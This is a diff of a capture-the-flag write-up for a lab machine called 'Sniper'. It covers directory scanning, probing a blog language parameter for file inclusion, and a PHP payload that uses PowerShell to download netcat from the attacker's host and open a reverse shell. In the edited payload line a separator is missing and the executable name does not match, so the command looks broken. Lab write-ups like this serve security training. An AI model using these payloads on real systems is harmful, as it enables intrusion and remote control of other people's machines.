@@ -8,26 +8,26 @@
 
 Short Summary
 
-- Phase 1  Reconnaissance.
+- Phase 1 - Reconnaissance.
 
     1.1 Running Nmap.
 
-- Phase 2  Scanning.
+- Phase 2 - Scanning.
     - 2.1 Scanning port **80.**
 
         2.1.1 User portal scanning.
 
         2.1.2 /blog scanning.
 
-- Phase 3   Gaining Access.
+- Phase 3 - Gaining Access.
 
     3.1 Exploit Remote File Inclusion to get a reverse shell..
 
-- Phase 4   Elevate privileges.
+- Phase 4 - Elevate privileges.
 
-    4.1 From iusr to Chris
+    4.1 From **iusr** to **Chris**
 
-    4.2 From Chris to root
+    4.2 From **Chris** to **root**
 
 ### **Summary**
 
@@ -43,7 +43,7 @@ The machine was about:
 
 5- Found a **note.tx**t in the **C:\Docs** directory file that orders chris to drop **chm** documents into this Docs directory.
 
-6- We inject a payload into chm file and upload it to C:\Docs directory.
+6- We inject a payload into chm file and upload it to **C:\Docs** directory.
 
 7- Our payload will be executed and you will get a shell.
 
@@ -139,7 +139,7 @@ Nothing here but let's check the source code.
 
 It is just the SVG animation icon nothing important here. so we fire gobuster again against this portal but with our cookies.
 
-    gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [http://10.10.10.151/user](http://10.10.10.151/user) -t 20 -H "PHPSESSID: 1qu8fu99kn9af8rnon6vj63tsa"
+    gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.151/user -t 20 -H "PHPSESSID: 1qu8fu99kn9af8rnon6vj63tsa"
 
 letting gobuster finish its work, we start scanning the **blog.**
 
@@ -151,9 +151,9 @@ no functions here except for changing the language of the posts. and it is funct
 
 so the request to change the language will be.
 
-English: [http://sniper.htb/blog/?lang=**blog-en.php](http://10.10.10.151/blog/?lang=blog-en.php)** 
+English: http://10.10.10.151/blog/?lang=**blog-en.php** 
 
-Spanish:  [http://10.10.10.151/blog/?lang=**blog-es.php**](http://10.10.10.151/blog/?lang=blog-es.php)
+Spanish: http://10.10.10.151/blog/?lang=**blog-es.php**
 
 so it loads different php page for every language!, So maybe we can test for **RFI/LFI, Path Traversal.**
 
@@ -171,7 +171,7 @@ so it loads different php page for every language!, So maybe we can test for **R
     - Send a request to our server.
     - check our server log to see if we get any requests from the server.
 
-    the request will be something like  [http://sniper.htb/blog/?lang=](http://10.10.10.151/blog/?lang=blog-es.php)http://:/anyfile
+    the request will be something like http://10.10.10.151/blog/?lang=http://<ip>:<port>/anyfile
 
     Unfortunately, we didn't get any request from the server and the sniper server returned 404.
 
@@ -183,7 +183,7 @@ so it loads different php page for every language!, So maybe we can test for **R
 
     Using this method we try to get the source code of a page using something called **wrappers.** I will try using PHP wrapper you can search for other wrappers.
 
-    the request will *[http://sniper.htb/blog/?lang=pHp://FilTer/convert.base64-encode/resource=blog-en.php](http://sniper.htb/blog/?lang=pHp://FilTer/convert.base64-encode/resource=blog-en.php) ,* the request will try to encode the source code of blog-en.php to base64 and **send it back.
+    the request will http://sniper.htb/blog/?lang=pHp://FilTer/convert.base64-encode/resource=blog-en.php ,the request will try to encode the source code of blog-en.php to base64 and send it back.
 
     but also this method fails.
 
@@ -212,7 +212,7 @@ so it loads different php page for every language!, So maybe we can test for **R
 And the PHP code is executed!. Great, now we should include a PHP reverse shell. Here is my php code to get a rev shell
 
     <?php
-    exec('powershell.exe mkdir C:\temp; iwr -outf C:\temp\nc64.exe [http://10.10.17.157:9090/nc64.exe;](http://10.10.17.157:9090/nc64.exe;) C:\temp\mymy.exe 10.10.17.157 8888 -e powershell 2>&1', $output);
+    exec('powershell.exe mkdir C:\temp; iwr -outf C:\temp\nc64.exe http://10.10.17.157:9090/nc64.exe C:\temp\mymy.exe 10.10.17.157 8888 -e powershell 2>&1', $output);
     print_r($output);
     ?>
 
